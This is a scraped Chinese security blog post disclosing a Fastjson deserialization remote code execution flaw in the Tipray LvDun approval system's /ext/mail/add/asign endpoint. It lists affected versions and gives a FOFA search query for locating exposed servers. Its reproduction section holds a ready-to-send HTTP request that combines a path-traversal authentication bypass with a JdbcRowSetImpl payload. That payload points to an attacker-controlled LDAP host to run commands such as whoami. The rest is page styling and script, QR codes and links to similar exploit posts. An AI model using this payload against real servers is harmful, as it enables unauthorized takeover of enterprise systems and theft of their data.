---
title: "天锐绿盾审批系统 /ext/mail/add/asign fastjson反序列化漏洞"
source: https://mrxn.net/jswz/trwfe-asign-rce.html
asset_dir: assets/天锐绿盾审批系统-extmailaddasign-fastjson反序列化漏洞
---

# 天锐绿盾审批系统 /ext/mail/add/asign fastjson反序列化漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/24 08:30
* 384浏览
* [0评论](#comment)
* 9分钟阅读

深入探索

SQL注入检测工具

安全认证考试

Windows安全工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

天锐绿盾审批系统是一款企业级数据防泄密（DLP）解决方案，主要用于对企业内部的敏感文件进行透明加密、权限管理以及审批流程控制，旨在防止数据泄露并保障信息安全。

漏洞扫描服务

该系统的 `/ext/mail/add/asign` 接口存在 Fastjson 反序列化漏洞。攻击者可以通过构造恶意的 JSON 数据包，利用 Fastjson 库在处理数据时存在的反序列化缺陷，在未经授权的情况下，在服务器端[执行任意代码](https://mrxn.net/tag/rce)。

成功利用此漏洞可能导致服务器被完全控制，攻击者可以窃取敏感数据、植入恶意程序、篡改系统配置，甚至对整个企业网络造成严重破坏，对企业的业务连续性和数据安全构成重大威胁。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

深入探索

在线安全工具

VPN服务

安全运维咨询

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 文件大小转换

# 漏洞分析

先看下fastjson的版本

[![天锐绿盾审批系统 /ext/mail/add/asign fastjson反序列化漏洞](images/img-001-bf5eec946068.webp)](https://image.mrxn.net/6c9d55d04edc4ceeaa535b223930bc62.webp)

1.2.7版本，不是最新版，是存在反序列化[rce](https://mrxn.net/tag/rce)漏洞的。

深入探索

网络安全课程

身份验证

技术文章订阅

再看`/ext/mail/add/asign` 的实现部分

[![天锐绿盾审批系统 /ext/mail/add/asign fastjson反序列化漏洞](images/img-002-a990ab1b6647.webp)](https://image.mrxn.net/d826133c3b7f458389256243cc86f4c4.webp)

请求body部分被直接用于`JSONObject.parseObject`进行反序列化操作，非常明显的fastjson反序列化漏洞没啥好分析的。

深入探索

安全研究报告

服务器安全服务

恶意软件分析工具

# 漏洞复现

使用`Java Chains`的`JNDILDAPDeserializePayload`下的`Fastjson反序列化链`配合`One For All Echo 回显`来完成利用

漏洞扫描服务

[![天锐绿盾审批系统 /ext/mail/add/asign fastjson反序列化漏洞](images/img-003-db8addf19f19.webp)](https://image.mrxn.net/870b48bf03354b849c2e619f13050468.webp)

```
POST /trwfe/login.jsp/.%2e/rest/ext/mail/add/asign HTTP/1.1
Host: trwfe.mrxn.net
X-Authorization: whoami
Content-Type: application/json

{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://vpsip:50389/xxxxx",
    "autoCommit": true
}
```

成功执行`whoami`命令 并回显[命令执行](https://mrxn.net/tag/rce)结果

[![天锐绿盾审批系统 /ext/mail/add/asign fastjson反序列化漏洞](images/img-004-94f7aafee6d2.webp)](https://image.mrxn.net/7aa29d6997a4445280a8315a514d9750.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[天锐绿盾审批系统 /ext/mail/add/asign fastjson反序列化漏洞](https://mrxn.net/jswz/trwfe-asign-rce.html)  
文章链接：<https://mrxn.net/jswz/trwfe-asign-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

文件大小转换

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-asign-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-asign-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 